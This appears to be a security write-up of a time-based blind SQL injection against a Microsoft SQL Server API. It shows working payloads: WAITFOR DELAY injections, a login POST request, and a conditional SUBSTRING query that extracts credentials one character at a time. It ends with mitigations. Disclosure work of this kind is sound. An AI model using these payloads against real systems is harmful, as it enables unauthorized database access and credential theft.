# 🛡️ Blind SQL Injection → Time-Based Data Extraction 🛡️  
**Category:** 🗄️ Web Security | 💉 SQL Injection | ⚠️ Critical  
**Case Type:** Blind SQLi (Time-Based)

> Note: All data and identifiers have been sanitized. No sensitive information is disclosed.

---

## 📝 1. Executive Summary
A time-based Blind SQL Injection vulnerability was identified across multiple API endpoints. The application failed to sanitize user input, allowing injection into backend Microsoft SQL Server queries.

The vulnerability was confirmed using time-delay payloads and further validated by extracting the first user's credentials in a controlled proof-of-concept.

> **Key Insight:** User-controlled input is directly embedded into SQL queries without parameterization, enabling full database compromise.

---

## 🎯 2. Target Overview
- **Application Type:** API-based system  
- **Backend:** Microsoft SQL Server  
- **Entry Point:** JSON request body parameters  
- **Authentication:** Required  

---

## 🔍 3. Discovery Phase

### Observation
- Multiple endpoints accept user input without validation  
- No error-based SQL responses  
- Suspicion of blind injection  

### Initial Test Payload
```sql
'; WAITFOR DELAY '0:0:5'--
```

### Expected Behavior
- Normal response time: ~200–300ms  

### Observed Behavior
- Response delayed by ~5 seconds consistently  

### Conclusion
- Backend executes injected SQL → confirms Blind SQL Injection  

---

## ⚠️ 4. Vulnerability Details

### Root Cause
- No input sanitization  
- No parameterized queries  
- Direct string concatenation in SQL  

### Likely Query Pattern
```sql
SELECT * FROM users WHERE username = '<user_input>'
```

---

## 🚀 5. Exploitation

### Step 1: Confirm Injection
```http
POST /api/login
Content-Type: application/json

{
  "username": "test'; WAITFOR DELAY '0:0:5'--",
  "password": "test"
}
```

**Result:** Consistent 5-second delay

---

### Step 2: Conditional Extraction
```sql
'; IF (SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--
```

### Observed Behavior
- Delay triggered only when condition is true  

---

### Step 3: Data Retrieval
Using iterative payloads:
- Extracted first user's:
  - Username  
  - Password (format depends on backend storage)

---

## 🐚 6. Impact

### Severity: Critical

### Confirmed Impact
- Unauthorized database query execution  
- Extraction of user credentials  

### Potential Impact
- Full database compromise  
- Account takeover  
- Privilege escalation  

---

## 📊 7. Validation

- Tested across multiple API endpoints  
- Injection confirmed in multiple parameters  
- Time delay consistent (5s ± ~200ms)  
- Behavior reproducible across requests  

---

## ⚠️ 8. Limitations

- Full database dump not performed (responsible testing)  
- Proof limited to first user record  

---

## 🔐 9. Mitigation

- Use parameterized queries / prepared statements  
- Implement strict input validation  
- Apply least privilege to database users  
- Add WAF rules for SQLi detection  

---

## 🛠️ Tools Used
- Burp Suite (request interception)  
- Manual payload crafting  

---

## 🧠 Notes / Learnings
- Blind SQLi is slower but reliable when errors are suppressed  
- Testing every parameter is critical — injection was widespread  
